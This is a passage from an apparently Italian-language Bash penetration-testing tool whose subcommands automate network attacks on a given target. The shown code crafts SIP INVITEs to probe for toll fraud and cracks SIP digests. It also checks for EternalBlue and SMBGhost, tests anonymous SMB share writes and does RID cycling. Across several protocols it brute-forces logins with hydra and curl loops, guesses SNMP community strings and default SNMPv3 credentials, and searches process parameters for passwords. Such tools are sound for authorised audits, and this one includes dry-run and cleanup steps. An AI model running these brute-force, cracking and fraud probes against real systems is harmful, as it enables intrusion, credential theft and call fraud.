            local tcp_probe; tcp_probe=$(printf 'OPTIONS sip:%s SIP/2.0\r\nVia: SIP/2.0/TCP %s:5060;branch=z9hG4bKtcp\r\nFrom: <sip:test@%s>;tag=1\r\nTo: <sip:%s>\r\nCall-ID: tcp@%s\r\nCSeq: 1 OPTIONS\r\nMax-Forwards: 10\r\nContent-Length: 0\r\n\r\n' \
                "$target" "$attacker_ip" "$attacker_ip" "$target" "$attacker_ip")
            local tcp_resp
            tcp_resp=$(printf '%b' "$tcp_probe" | nc -w 3 "$target" "$port" 2>/dev/null | head -1 || true)
            echo "SIP/TCP:$port → $tcp_resp" >> "$OUTDIR/sip_methods.txt"
            echo "$tcp_resp" | grep -qi "SIP/2.0" && \
                found INFO "SIP:$port — risponde anche su TCP (non solo UDP)"
        } || true
    fi

    section "SIP Digest Crack (sipcrack/sipdump)"
    if [[ -s "$OUTDIR/sip_digest_challenges.txt" && $DRY_RUN -eq 0 ]]; then
        local wl="${wordlist:-$(_wl_pass)}"
        if tool_ok sipcrack; then
            run_cmd "sipcrack" \
                "sipcrack -w $wl \"$OUTDIR\"/sip_digest_challenges.txt 2>&1 \
                 | tee \"$OUTDIR\"/sipcrack_results.txt"
            grep -i "password\|cracked" "$OUTDIR/sipcrack_results.txt" 2>/dev/null | \
                while IFS= read -r line; do found HIGH "SIP DIGEST CRACKED — $line"; done || true
        else
            warn "sipcrack non trovato — digest offline crack saltato"
        fi
    fi

    section "SIP Toll Fraud Probe (INVITE verso PSTN esterno)"
    if [[ $DRY_RUN -eq 0 ]]; then
        local attacker_ip; attacker_ip=$(hostname -I | awk '{print $1}')
        # Prova INVITE verso numero esterno (non reale — solo test se il gateway accetta)
        local toll_dest="sip:00390000000@${target}"
        local toll_invite
        toll_invite="INVITE ${toll_dest} SIP/2.0\r\n"
        toll_invite+="Via: SIP/2.0/UDP ${attacker_ip}:5060;branch=z9hG4bKtf1\r\n"
        toll_invite+="Max-Forwards: 70\r\n"
        toll_invite+="From: <sip:100@${attacker_ip}>;tag=tf1\r\n"
        toll_invite+="To: <${toll_dest}>\r\n"
        toll_invite+="Call-ID: tf1@${attacker_ip}\r\n"
        toll_invite+="CSeq: 1 INVITE\r\n"
        toll_invite+="Content-Length: 0\r\n\r\n"
        local tf_resp
        tf_resp=$(printf '%b' "$toll_invite" | nc -u -w 3 "$target" "$port" 2>/dev/null | head -1 || true)
        echo "Toll fraud INVITE → $tf_resp" >> "$OUTDIR/sip_methods.txt"
        # 100 Trying / 180 Ringing → gateway prova a instradare → toll fraud possibile
        if echo "$tf_resp" | grep -qE "^SIP/2.0 (100|180|183|200)"; then
            found CRITICAL "SIP:$port — TOLL FRAUD possibile: gateway ha accettato INVITE verso PSTN esterno (${tf_resp})"
        elif echo "$tf_resp" | grep -q "^SIP/2.0 40[17]"; then
            found MEDIUM "SIP:$port — gateway richiede auth per chiamate esterne (${tf_resp}) — brute force applicabile"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} SIP toll fraud probe (INVITE PSTN) → $target:$port"
    fi

    ok "SIP audit completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: smb
# ============================================================
usage_smb() {
    echo "Uso: exa-dune smb <TARGET> [OPTIONS]"
    echo ""
    echo "  SMB/NetBIOS enumeration e audit"
    echo "  Wraps: nmap smb NSE, enum4linux, smbclient, hydra"
    echo ""
    echo "Opzioni:"
    echo "  --no-bruteforce    Salta hydra SMB brute force"
    echo "  --threads N        Thread hydra (default: 4)"
    echo "  --userlist FILE"
    echo "  --passlist FILE"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_smb() {
    local target="" do_brute=1 threads=4
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --no-bruteforce) do_brute=0;          shift ;;
            --threads)       threads="$2";        shift 2 ;;
            --userlist)      CUSTOM_USERS="$2";   shift 2 ;;
            --passlist)      CUSTOM_PASS="$2";    shift 2 ;;
            --output)        OUTDIR_BASE="$2";    shift 2 ;;
            --dry-run)       DRY_RUN=1;           shift ;;
            --help|-h)       usage_smb; exit 0 ;;
            -*)              err "Opzione sconosciuta: $1"; usage_smb; exit 1 ;;
            *)               target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_smb; exit 1; }
    validate_target "$target"
    setup_outdir "$target" "smb"
    log "Target: $target | Output: $OUTDIR"

    section "Nmap SMB NSE Scripts"
    run_cmd "nmap_smb" \
        "nmap -p 139,445 \
         --script smb-vuln*,smb-enum-users,smb-enum-shares,smb-os-discovery,smb-security-mode \
         -oN "$OUTDIR"/nmap_smb.txt $target 2>&1"

    section "NBTStat Info"
    run_cmd "nbtstat" "nmap -p 137 --script nbstat $target -oN "$OUTDIR"/nbtstat.txt 2>&1"

    section "enum4linux"
    if require_tool enum4linux; then
        run_cmd "enum4linux" "enum4linux -a $target 2>&1 | tee "$OUTDIR"/enum4linux.txt"
    fi

    section "Null Session (smbclient)"
    if require_tool smbclient; then
        run_cmd "smb_null" "smbclient -L '//$target' -N 2>&1 | tee "$OUTDIR"/smb_null.txt"
    fi

    section "EternalBlue MS17-010 + SMBGhost CVE-2020-0796"
    run_cmd "nmap_eternalblue" \
        "nmap -p 445 --script smb-vuln-ms17-010 \
         -oN \"$OUTDIR\"/nmap_ms17010.txt $target 2>&1"
    run_cmd "nmap_smbghost" \
        "nmap -p 445 --script smb-vuln-cve-2020-0796 \
         -oN \"$OUTDIR\"/nmap_smbghost.txt 2>/dev/null $target 2>&1 || \
         nmap -p 445 --script safe \
         -oN \"$OUTDIR\"/nmap_smbghost.txt $target 2>&1"
    if [[ $DRY_RUN -eq 0 ]]; then
        grep -qiE "VULNERABLE|MS17-010" "$OUTDIR/nmap_ms17010.txt" 2>/dev/null && \
            found CRITICAL "SMB:445 — EternalBlue MS17-010 VULNERABILE"
        grep -qiE "VULNERABLE|CVE-2020-0796" "$OUTDIR/nmap_smbghost.txt" 2>/dev/null && \
            found CRITICAL "SMB:445 — SMBGhost CVE-2020-0796 VULNERABILE"
    fi

    section "SMB Share Write Permission Test"
    if [[ $DRY_RUN -eq 0 ]] && require_tool smbclient; then
        # Prova scrittura su share noti con null session
        for share in "IPC\$" "C\$" "ADMIN\$" "Users" "share" "public" "data"; do
            local write_test
            write_test=$(smbclient "//${target}/${share}" -N \
                -c "put /dev/null .exa_write_test" 2>&1 || true)
            if echo "$write_test" | grep -qiE "NT_STATUS_OK|putting file"; then
                found CRITICAL "SMB — scrittura anonima su share: ${share}"
                smbclient "//${target}/${share}" -N \
                    -c "del .exa_write_test" 2>/dev/null || true
            fi
        done
        # RID cycling user enumeration
        if tool_ok rpcclient; then
            run_cmd "rid_cycle" \
                "for rid in \$(seq 500 530); do \
                     rpcclient -N -U '' $target -c \"lookupnames guest\" 2>/dev/null | head -1; \
                     rpcclient -N -U '' $target -c \"lookupsids S-1-5-21-\$rid\" 2>/dev/null; \
                 done | grep -v 'NT_STATUS' | tee \"$OUTDIR\"/rid_cycle.txt"
        fi
    fi

    if [[ $do_brute -eq 1 ]]; then
        section "SMB Brute Force (hydra)"
        if require_tool hydra; then
            local ul; ul=$(_wl_users)
            local pl; pl=$(_wl_pass)
            run_cmd "hydra_smb" \
                "hydra -L $ul -P $pl -t $threads -f \
                 -o "$OUTDIR"/hydra_smb.txt $target smb 2>&1 | tee -a "$OUTDIR"/smb_audit.log"
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/hydra_smb.txt" ]]; then
                grep -i "login:" "$OUTDIR/hydra_smb.txt" 2>/dev/null \
                    | while IFS= read -r line; do found HIGH "SMB — $line"; done || true
            fi
        fi
    fi

    ok "SMB audit completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: creds
# ============================================================
usage_creds() {
    echo "Uso: exa-dune creds <TARGET> <SERVICE> [OPTIONS]"
    echo ""
    echo "  Credential brute force multiprotocollo"
    echo "  Wraps: hydra, curl (http basic)"
    echo ""
    echo "  SERVICE            ssh ftp telnet http https smb rdp vnc imap pop3 all"
    echo ""
    echo "Opzioni:"
    echo "  --port PORT        Porta (override default del servizio)"
    echo "  --path PATH        Path per http/https (default: /)"
    echo "  --userlist FILE"
    echo "  --passlist FILE"
    echo "  --threads N        Thread hydra (default: 4)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_creds() {
    local target="" service="" port="" path="/" threads=4
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)      port="$2";        shift 2 ;;
            --path)      path="$2";        shift 2 ;;
            --userlist)  CUSTOM_USERS="$2"; shift 2 ;;
            --passlist)  CUSTOM_PASS="$2"; shift 2 ;;
            --threads)   threads="$2";     shift 2 ;;
            --output)    OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)   DRY_RUN=1;        shift ;;
            --help|-h)   usage_creds; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_creds; exit 1 ;;
            *)
                if [[ -z "$target" ]]; then target="$1"
                elif [[ -z "$service" ]]; then service="$1"
                else err "Argomento inaspettato: $1"; usage_creds; exit 1; fi
                shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_creds; exit 1; }
    [[ -z "$service" ]] && { err "SERVICE mancante (ssh/ftp/telnet/http/https/smb/rdp/all)"; usage_creds; exit 1; }
    validate_target "$target"
    [[ -n "$port" ]] && validate_port "$port"
    setup_outdir "$target" "creds"
    log "Target: $target | Servizio: $service | Output: $OUTDIR"

    local ul; ul=$(_wl_users)
    local pl; pl=$(_wl_pass)

    _hydra() {
        local svc="$1" p="$2"
        local out="$OUTDIR/hydra_${svc}_${p}.txt"
        run_cmd "hydra_${svc}_${p}" \
            "hydra -L $ul -P $pl -s $p -t $threads -f \
             -o $out $target $svc 2>&1 | tee -a $OUTDIR/creds.log"
        if [[ $DRY_RUN -eq 0 && -f "$out" ]]; then
            grep -i "login:" "$out" 2>/dev/null \
                | while IFS= read -r line; do found HIGH "${svc^^}:${p} — $line"; done || true
        fi
    }

    # Ritorna 0 se il target usa realmente HTTP Basic Auth (risponde 401 a credenziali fasulle)
    _http_requires_auth() {
        local scheme="$1" p="$2"
        local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
        local bogus_code
        bogus_code=$(curl -s $insecure -o /dev/null -w "%{http_code}" \
                     --user "__bogus_exa__:__bogus_exa__" --max-time 5 \
                     "${scheme}://${target}:${p}${path}" 2>/dev/null || echo "000")
        if [[ "$bogus_code" == "200" || "$bogus_code" == "302" ]]; then
            warn "  Falso positivo rilevato: ${scheme}://${target}:${p} risponde $bogus_code anche senza auth — test HTTP saltato"
            return 1
        fi
        return 0
    }

    _http_basic() {
        local scheme="$1" p="$2"
        local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
        if [[ $DRY_RUN -eq 1 ]]; then
            echo -e "${CYAN}[DRY-RUN]${NC} HTTP Basic auth test ${scheme}://${target}:${p}${path}"
            return
        fi
        # Anti-falso-positivo: salta se il target non usa HTTP Basic Auth
        _http_requires_auth "$scheme" "$p" || return 0
        local found_count=0
        while IFS= read -r user; do
            [[ -z "$user" ]] && continue
            while IFS= read -r pass; do
                [[ -z "$pass" ]] && continue
                local code
                code=$(curl -s $insecure -o /dev/null -w "%{http_code}" \
                       --user "${user}:${pass}" --max-time 5 \
                       "${scheme}://${target}:${p}${path}" 2>/dev/null)
                if [[ "$code" == "200" || "$code" == "302" ]]; then
                    found HIGH "HTTP Basic ${scheme}:${p} — ${user}:${pass} → HTTP $code"
                    ((found_count++)) || true
                fi
            done < "$pl"
        done < "$ul"
        [[ $found_count -eq 0 ]] && log "  Nessuna credenziale HTTP Basic trovata"
    }

    require_tool hydra || return 1

    case "$service" in
        ssh)    _hydra ssh   "${port:-22}" ;;
        ftp)    _hydra ftp   "${port:-21}" ;;
        telnet) _hydra telnet "${port:-23}" ;;
        smb)    _hydra smb   "${port:-445}" ;;
        rdp)    _hydra rdp   "${port:-3389}" ;;
        http)   _http_requires_auth http "${port:-80}" && _hydra http-get "${port:-80}" || true
                _http_basic http "${port:-80}" ;;
        https)  _http_requires_auth https "${port:-443}" && _hydra https-get "${port:-443}" || true
                _http_basic https "${port:-443}" ;;
        vnc)    _hydra vnc   "${port:-5900}" ;;
        imap)   _hydra imap  "${port:-143}" ;;
        pop3)   _hydra pop3  "${port:-110}" ;;
        all)
            _hydra ssh    "${port:-22}"
            _hydra ftp    "${port:-21}"
            _hydra telnet "${port:-23}"
            _hydra smb    "${port:-445}"
            { _http_requires_auth http "${port:-80}"  && _hydra http-get  "${port:-80}"; } || true
            { _http_requires_auth https "${port:-443}" && _hydra https-get "${port:-443}"; } || true
            _hydra vnc    "${port:-5900}"
            _hydra imap   "${port:-143}"
            _hydra pop3   "${port:-110}"
            ;;
        *) err "Servizio sconosciuto: $service (usa: ssh ftp telnet http https smb rdp vnc imap pop3 all)"; exit 1 ;;
    esac

    ok "Creds test completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: snmp
# ============================================================
usage_snmp() {
    echo "Uso: exa-dune snmp <TARGET> [OPTIONS]"
    echo ""
    echo "  SNMP audit — community string brute force + walk"
    echo "  Wraps: nmap snmp NSE, snmpwalk, snmpget"
    echo ""
    echo "Opzioni:"
    echo "  --communities FILE  File con community string (una per riga)"
    echo "  --version V         SNMP version: 1, 2c, 3 (default: prova 1 e 2c)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_snmp() {
    local target="" communities_file="" snmp_ver=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --communities)  communities_file="$2"; shift 2 ;;
            --version)      snmp_ver="$2";         shift 2 ;;
            --output)       OUTDIR_BASE="$2";      shift 2 ;;
            --dry-run)      DRY_RUN=1;             shift ;;
            --help|-h)      usage_snmp; exit 0 ;;
            -*)             err "Opzione sconosciuta: $1"; usage_snmp; exit 1 ;;
            *)              target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_snmp; exit 1; }
    validate_target "$target"
    setup_outdir "$target" "snmp"
    log "Target: $target | Output: $OUTDIR"

    section "Nmap SNMP Scan (UDP 161/162)"
    run_cmd "nmap_snmp" \
        "nmap -sU -p 161,162 \
         --script snmp-info,snmp-sysdescr,snmp-brute \
         -oN "$OUTDIR"/nmap_snmp.txt $target 2>&1"

    section "Community String Brute Force"
    local cfile
    if [[ -n "$communities_file" && -f "$communities_file" ]]; then
        cfile="$communities_file"
    else
        CUSTOM_COMM="" cfile=$(_wl_snmp)
    fi

    if require_tool snmpwalk; then
        if [[ $DRY_RUN -eq 0 ]]; then
            local found_comm=""
            while IFS= read -r community; do
                [[ -z "$community" ]] && continue
                for ver in v2c v1; do
                    local result
                    result=$(snmpwalk -"$ver" -c "$community" -t 2 -r 1 "$target" sysDescr 2>&1 | head -2)
                    if echo "$result" | grep -qiE "STRING:|INTEGER:|Timeticks:"; then
                        local summary; summary=$(echo "$result" | head -1 | tr -d '\n\r' | tr -s ' ')
                        found HIGH "SNMP community '$community' ($ver) → $summary"
                        found_comm="$community"
                        break 2
                    fi
                done
            done < "$cfile"

            if [[ -n "$found_comm" ]]; then
                section "SNMP Full Walk (community: $found_comm)"
                snmpwalk -v2c -c "$found_comm" "$target" 2>&1 | tee "$OUTDIR/snmp_walk_full.txt"
                snmpget -v2c -c "$found_comm" "$target" \
                    sysDescr.0 sysName.0 sysLocation.0 sysContact.0 sysUpTimeInstance 2>&1 \
                    | tee "$OUTDIR/snmp_sysinfo.txt"

                section "SNMP Extended OID Walk"
                # Interfacce di rete
                snmpwalk -v2c -c "$found_comm" "$target" ifDescr 2>&1 \
                    | tee "$OUTDIR/snmp_interfaces.txt"
                snmpwalk -v2c -c "$found_comm" "$target" ifAdminStatus 2>&1 \
                    | tee -a "$OUTDIR/snmp_interfaces.txt"
                snmpwalk -v2c -c "$found_comm" "$target" ipAdEntAddr 2>&1 \
                    | tee "$OUTDIR/snmp_ip_addresses.txt"
                # Routing table
                snmpwalk -v2c -c "$found_comm" "$target" ipRouteTable 2>&1 \
                    | tee "$OUTDIR/snmp_routes.txt"
                # Processi attivi (HR-MIB)
                snmpwalk -v2c -c "$found_comm" "$target" hrSWRunName 2>&1 \
                    | tee "$OUTDIR/snmp_processes.txt"
                # TCP connections
                snmpwalk -v2c -c "$found_comm" "$target" tcpConnState 2>&1 \
                    | tee "$OUTDIR/snmp_tcp_conn.txt"
                # Storage
                snmpwalk -v2c -c "$found_comm" "$target" hrStorageDescr 2>&1 \
                    | tee "$OUTDIR/snmp_storage.txt"
                # Utenti di sistema (se disponibile)
                snmpwalk -v2c -c "$found_comm" "$target" hrSWRunParameters 2>&1 \
                    | tee "$OUTDIR/snmp_sw_params.txt"
                # Software installato
                snmpwalk -v2c -c "$found_comm" "$target" hrSWInstalledName 2>&1 \
                    | tee "$OUTDIR/snmp_installed.txt"
                # Ricerca credenziali in processi/parametri
                grep -iE "pass|password|key|secret|token" \
                    "$OUTDIR/snmp_processes.txt" "$OUTDIR/snmp_sw_params.txt" 2>/dev/null | \
                    while IFS= read -r line; do found HIGH "SNMP — possibile credenziale in OID: $line"; done || true

                section "SNMP Write Community Test (sysName.0)"
                if tool_ok snmpset; then
                    local orig_name
                    orig_name=$(snmpget -v2c -c "$found_comm" "$target" sysName.0 2>/dev/null \
                        | grep -oP 'STRING: \K.+' | head -1 || true)
                    if snmpset -v2c -c "$found_comm" -t 2 -r 1 "$target" \
                       sysName.0 s "exa-dune-write-test" 2>/dev/null; then
                        found CRITICAL "SNMP — WRITE access con community '$found_comm'"
                        # Ripristino
                        [[ -n "$orig_name" ]] && \
                            snmpset -v2c -c "$found_comm" -t 2 -r 1 "$target" \
                            sysName.0 s "$orig_name" 2>/dev/null || true
                    fi
                fi

                section "SNMP v3 Enumeration"
                if tool_ok snmpwalk; then
                    # Prova con credenziali comuni SNMPv3
                    local v3_creds=(
                        "admin:authpass:privpass" "admin:password:password"
                        "snmpuser:snmpuser:snmpuser" "root:rootpass:rootpass"
                    )
                    for v3c in "${v3_creds[@]}"; do
                        local v3u="${v3c%%:*}"
                        local v3rest="${v3c#*:}"; local v3ap="${v3rest%%:*}"; local v3pp="${v3rest#*:}"
                        local v3res
                        v3res=$(snmpwalk -v3 -l authPriv -u "$v3u" \
                            -a MD5 -A "$v3ap" -x DES -X "$v3pp" \
                            -t 2 -r 1 "$target" sysDescr 2>&1 | head -1 || true)
                        if echo "$v3res" | grep -qiE "STRING:|INTEGER:"; then
                            found HIGH "SNMP v3 — credenziali valide: ${v3u}:${v3ap}:${v3pp}"
                            break
                        fi
                    done
                fi
            else
                log "Nessuna community trovata — SNMP filtrato o community non standard"
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} SNMP community brute force su $target ($(wc -l < "$cfile" 2>/dev/null || echo 0) stringhe)"
        fi
    fi

    # cfile punta a seclists o a _FALLBACK_SNMP (cleanup via trap EXIT)
    ok "SNMP audit completato → $OUTDIR"
}

